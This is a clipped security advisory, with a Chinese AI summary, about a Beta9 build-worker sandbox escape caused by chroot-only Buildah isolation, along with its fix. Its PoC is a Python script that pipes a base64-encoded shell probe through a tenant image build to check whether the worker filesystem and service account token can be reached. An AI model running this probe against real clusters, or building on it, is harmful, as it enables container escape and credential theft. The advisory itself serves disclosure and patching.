---
title: Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
source: https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/
source_host: research.jfrog.com
clip_date: 2026-11-01T21:28:40+08:00
trace_id: dfdea094-284c-4d79-8318-4f2acd04b1ed
content_hash: 4e748e6b96573e4ab25b4e39a797619bf50cdb4696f8af65fa9c147db8c302a0
status: synced
tags:
  - 漏洞分析
  - 容器逃逸
series: null
feed_source: JFrog Security Research·漏洞研究
ai_summary: Beta9 worker（< 0.1.756）因 Buildah 仅采用 chroot 隔离，租户一次镜像构建即可逃逸沙箱，访问 worker 容器文件系统及 Kubernetes 凭据。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40b75244-d011-81a4-be30-e563126e2ffb
ioc:
  cves:
    - CVE-2026-120306
  cwes: []
  hashes:
    - a28bf12cf0007c792a25d8ed282b4e8bf6f30393
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Beta9 worker（< 0.1.756）因 Buildah 仅采用 chroot 隔离，租户一次镜像构建即可逃逸沙箱，访问 worker 容器文件系统及 Kubernetes 凭据。
> 
> - **根因：** Beta9 把租户镜像定义中的 shell 命令转成 Dockerfile RUN 行，由构建 worker 上的 Buildah 执行；worker 镜像设置 `BUILDAH_ISOLATION=chroot` 且所有 buildah 调用均未传 `--isolation`，构建步骤只切换文件系统根，仍保留 worker pod 的 PID、网络、IPC 和用户命名空间。
> - **逃逸效果：** 构建步骤以 uid 0 运行并持有 `CAP_DAC_OVERRIDE`，可绕过 `/proc/1/root`（即 worker 容器文件系统，且可写）上的权限检查；该文件系统内有 runc/buildah/runsc 二进制、worker 的 Kubernetes service account token 及挂载进 pod 的宿主目录，且 worker pod 本身是特权模式。
> - **触发条件：** Clip v2 分层构建为默认，租户仅凭一个 workspace token 提交一次镜像构建即可触达，无需 pool 选择器或自定义基础镜像；作者提供了只读探测 PoC，确认共享命名空间、capability 位及 `/proc/1/root` 下 runc 可见（CVE-2026-120306）。
> - **修复方式：** 升级 worker 至 0.1.756 或更高（2026-09-15 发布，PR #1897，commit a28bf12）；该版本对 RUN 步骤（含 WORKDIR mkdir）改用 OCI 隔离，配私有 PID、IPC、网络命名空间，租户构建参数改为传入构建容器而非 Buildah 进程环境。

\## Summary Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation ## Component Beta9 worker (github.com/beam-cloud/beta9) ## Affected versions worker < 0.1.756 ## Description Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets \`BUILDAH\_ISOLATION=chroot\`, and no \`buildah\` invocation passes \`--isolation\`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds \`CAP\_DAC\_OVERRIDE\`. Pid 1 in that procfs is the worker entrypoint, so \`/proc/1/root\` is the worker container's filesystem and is writable. That filesystem holds \`runc\`, \`buildah\`, and \`runsc\`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, \`CAP\_DAC\_OVERRIDE\`, and that the worker \`runc\` binary is visible at \`/proc/1/root\`. Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment. ## PoC  
\*\*Step 1 - Install the client and select the deployment\*\*  
Any workspace token is enough. No pool selector, custom base image, or Docker option is required. \`\`\` pip install beta9 beta9 configure \`\`\`  
\*\*Step 2 - Save the read-only probe\*\*  
The probe reports uid, namespace identity, the effective capability mask, and whether the worker's \`runc\` binary and service-account token path are visible through \`/proc/1/root\`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache. \`\`\` #!/usr/bin/env python3 import base64 import re import sys import uuid from beta9.abstractions.image import Image from beta9.clients.image import BuildImageRequest MARK = "B9PROBE" PROBE = r""" set -u M=B9PROBE R=/proc/1/root echo "$M uid=$(id -u) pid=$$" echo "$M caps\_self=$(awk '/^CapEff/{print $2}' /proc/self/status)" echo "$M pidns\_self=$(readlink /proc/self/ns/pid)" echo "$M userns\_self=$(readlink /proc/self/ns/user)" echo "$M netns\_self=$(readlink /proc/self/ns/net)" echo "$M visible\_pids=$(ls /proc | grep -c '^\[0-9\]\[0-9\]\*$')" echo "$M init\_cmd=$(tr '\\0' ' ' < /proc/1/cmdline | tr -s ' ' '\_')" echo "$M caps\_init=$(awk '/^CapEff/{print $2}' /proc/1/status)" echo "$M pidns\_init=$(readlink /proc/1/ns/pid)" echo "$M userns\_init=$(readlink /proc/1/ns/user)" if \[ -e "$R/usr/local/sbin/runc" \]; then echo "$M worker\_runc=present" else echo "$M worker\_runc=absent" fi if \[ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" \]; then echo "$M sa\_token=readable" else echo "$M sa\_token=unreachable" fi if \[ -d "$R/images" \]; then echo "$M images\_mount=present" else echo "$M images\_mount=absent" fi exit 0 """ def probe\_command() -> str: blob = base64.b64encode(PROBE.encode()).decode() return f"echo {blob} | base64 -d | sh # {uuid.uuid4().hex}" def run\_build(command: str): log = \[\] for resp in Image(python\_version="python3", commands=\[command\]).stub.build\_image( BuildImageRequest( python\_version="python3", commands=\[command\], ignore\_python=True, ) ): if resp.msg: sys.stdout.write(resp.msg) sys.stdout.flush() log.extend(line for line in resp.msg.splitlines() if MARK in line) if resp.done: break return log def parse(log): facts = {} for line in log: tail = line.split(MARK, 1)\[1\] for key, value in re.findall(r"(\\w+)=(\\S+)", tail): facts\[key\] = value return facts def has\_dac\_override(cap\_hex: str) -> bool: try: return bool(int(cap\_hex, 16) & 0x2) except ValueError: return False def main() -> int: facts = parse(run\_build(probe\_command())) if not facts: print("\\nINCONCLUSIVE: the build log carried no probe output") return 2 print("\\nProbe results") for key in sorted(facts): print(f" {key} = {facts\[key\]}") neighbour = facts.get("worker\_runc") == "present" or "worker" in facts.get("init\_cmd", "") dac\_override = has\_dac\_override(facts.get("caps\_self", "0")) print() if neighbour and dac\_override: print( f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid " f"{facts.get('pid')} inside the worker's own PID and user namespaces, " f"resolved the worker container's filesystem at /proc/1/root, and holds " f"CAP\_DAC\_OVERRIDE, which bypasses permission checks on that filesystem" ) return 1 print("NOT VULNERABLE: the build step saw only its own container") return 0 if \_\_name\_\_ == "\_\_main\_\_": raise SystemExit(main()) \`\`\`  
\*\*Step 3 - Run the probe\*\*  
\`\`\` python3 poc\_beta9\_build\_isolation.py \`\`\`  
Expected output on a worker before 0.1.756: \`\`\` VULNERABLE: the build step ran as uid 0 as pid inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem \`\`\`  
The lines above that verdict include \`worker\_runc = present\`, a \`caps\_self\` mask with the \`CAP\_DAC\_OVERRIDE\` bit set, an \`init\_cmd\` naming the worker entrypoint, and a \`visible\_pids\` count covering the worker pod. On worker 0.1.756 or later the same build prints \`NOT VULNERABLE: the build step saw only its own container\`. ## Vulnerability Mitigations Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container. The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image. ## References https://www.cve.org/CVERecord?id=CVE-2026-120306 https://github.com/beam-cloud/beta9/pull/1897 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756 https://github.com/beam-cloud/beta9
